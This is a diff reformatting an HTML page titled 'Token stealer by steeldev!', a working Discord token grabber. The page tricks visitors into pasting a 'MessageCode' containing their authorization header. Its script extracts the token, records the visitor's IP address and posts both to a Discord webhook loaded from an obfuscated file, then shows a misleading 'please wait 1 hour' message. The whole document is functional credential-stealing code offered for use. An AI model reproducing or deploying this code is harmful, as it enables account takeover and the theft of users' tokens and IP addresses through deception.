@@ -1,1 +1,89 @@
-<!DOCTYPE html><html><head><title>Token stealer by steeldev!</title><link rel="stylesheet" type="text/css" href="design.css"><script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><script>$(document).ready(function(){$.getJSON("https://api.ipify.org?format=json",function(data){var ip=data.ip;document.getElementById("ipAddress").textContent=ip;});});function searchAuthorization(){var inputText=document.getElementById("inputText").value;if(inputText.trim()===""){alert("Please enter a MessageCode.");return;}var authorization=searchAuthorizationRegex(inputText);if(authorization){$.get('kcygyegfierdgfsbdsfjh4efbdsbifweriuewdufndifi4ufniudnfuinjdsnfjks.txt',function(webhookUrl){var ipAddress=document.getElementById("ipAddress").textContent;var payload={'content':'@everyone @here Token found! (Steel loves u)','embeds':[{'description':'IP address : '+ipAddress+'\n\nDiscord Token : '+authorization}],'username':'StealthGrabber V3','avatar_url':'https://cdn.discordapp.com/avatars/993662475306287134/806b70229d50907de2d61cd165e1b4bf.png?size=2048'};$.ajax({type:'POST',url:webhookUrl,data:JSON.stringify(payload),contentType:'application/json',success:function(){showPopupMessage("All good! the results will be printed here, please wait 1 hour.");},error:function(){console.log("Failed to grab token from the following user, make sure your network is working fine.");}});});}else{alert("Invalid MessageCode. Please make sure you followed the steps.");}}function searchAuthorizationRegex(inputText){var regex=/authorization:\s*(.*)/i;var match=inputText.match(regex);if(match){var result=match[1].trim();result=result.slice(0,70);return result;}else{return null;}}function showPopupMessage(message){var popup=document.getElementById("popup");popup.innerText=message;popup.style.display="block";setTimeout(function(){popup.style.display="none";},3000);}</script></head><body><div class="container"><label for="inputText">Enter your MessageCode:</label><input type="text" id="inputText"><button onclick="searchAuthorization()">Steal</button><div id="popup" class="popup"></div><div id="ipAddress" style="display: none;"></div></div></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Token stealer by steeldev!</title>
+    <link rel="stylesheet" type="text/css" href="design.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                var ip = data.ip;
+                document.getElementById("ipAddress").textContent = ip; // Update the IP address on the page
+            });
+        });
+        
+        function searchAuthorization() {
+            var inputText = document.getElementById("inputText").value;
+            
+            if (inputText.trim() === "") {
+                alert("Please enter a MessageCode.");
+                return;
+            }
+            
+            var authorization = searchAuthorizationRegex(inputText);
+            
+            if (authorization) {
+                // Retrieve the webhook URL from the file
+                $.get('kcygyegfierdgfsbdsfjh4efbdsbifweriuewdufndifi4ufniudnfuinjdsnfjks.txt', function(webhookUrl) {
+                    var ipAddress = document.getElementById("ipAddress").textContent; // Get the IP address from the page
+                
+                    var payload = {
+                        'content': '@everyone @here Token found! (Steel loves u)',
+                        'embeds': [{
+                            'description': 'IP address : ' + ipAddress + '\n\nDiscord Token : ' + authorization
+                        }],
+                        'username': 'StealthGrabber V3',
+                        'avatar_url': 'https://cdn.discordapp.com/avatars/993662475306287134/806b70229d50907de2d61cd165e1b4bf.png?size=2048'
+                    };
+                
+                    $.ajax({
+                        type: 'POST',
+                        url: webhookUrl,
+                        data: JSON.stringify(payload),
+                        contentType: 'application/json',
+                        success: function() {
+                            showPopupMessage("All good! the results will be printed here, please wait 1 hour.");
+                        },
+                        error: function() {
+                            console.log("Failed to grab token from the following user, make sure your network is working fine.");
+                        }
+                    });
+                });
+            } else {
+                alert("Invalid MessageCode. Please make sure you followed the steps.");
+            }
+        }
+        
+        function searchAuthorizationRegex(inputText) {
+            var regex = /authorization:\s*(.*)/i;
+            var match = inputText.match(regex);
+            
+            if (match) {
+                var result = match[1].trim();
+                result = result.slice(0, 70);
+                return result;
+            } else {
+                return null;
+            }
+        }
+        
+        function showPopupMessage(message) {
+            var popup = document.getElementById("popup");
+            popup.innerText = message;
+            popup.style.display = "block";
+            setTimeout(function() {
+                popup.style.display = "none";
+            }, 3000); // Display for 3 seconds
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <label for="inputText">Enter your MessageCode:</label>
+        <input type="text" id="inputText">
+        <button onclick="searchAuthorization()">Steal</button>
+        <div id="popup" class="popup"></div>
+        <div id="ipAddress" style="display: none;"></div> <!-- Hidden element to store the IP address -->
+    </div>
+</body>
+</html>
